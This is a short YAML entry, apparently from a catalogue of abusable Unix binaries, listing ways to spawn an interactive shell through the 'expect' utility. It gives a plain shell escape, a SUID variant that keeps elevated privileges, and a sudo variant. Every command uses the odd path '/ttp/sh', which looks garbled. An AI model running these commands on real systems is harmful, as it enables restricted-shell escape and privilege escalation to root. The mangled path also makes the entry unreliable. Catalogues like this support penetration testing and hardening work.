---
functions:
  shell:
    - code: expect -c 'spawn /ttp/sh;interact'
  suid:
    - code: ./expect -c 'spawn /ttp/sh -p;interact'
  sudo:
    - code: sudo expect -c 'spawn /ttp/sh;interact'
---
